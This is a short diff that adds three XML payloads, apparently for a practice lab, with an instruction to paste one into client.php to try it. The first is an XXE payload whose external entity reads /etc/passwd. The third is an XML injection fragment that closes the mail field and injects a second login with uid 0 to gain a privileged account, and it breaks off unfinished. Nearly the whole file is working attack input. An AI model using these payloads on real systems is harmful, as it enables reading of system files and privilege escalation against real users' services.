@@ -1,0 +1,24 @@
+
+COPY AND PASTE 1 OF THESE 3 pAYLOAD IN CLIENT.PHP TO TRY THEM 
+
+
+$xml = <<<XML
+<!DOCTYPE own [ <!ELEMENT own ANY >
+<!ENTITY own SYSTEM "file:///etc/passwd" >]>
+<login>
+    <user>&own;</user>
+    <pass>123</pass>
+    <mail>hack.com</mail>
+</login>
+XML;
+
+ $xml = <<<XML
+    <login>
+        <user>hack</user> 
+        <pass>123</pass>
+        <mail>hack.com</mail>
+    </login>
+XML;
+
+ee</mail></login><login><user>HackerThatcuoldChangeUserId</user>
+     <pass>mine</pass><uid>0</uid><mail>hackergmail
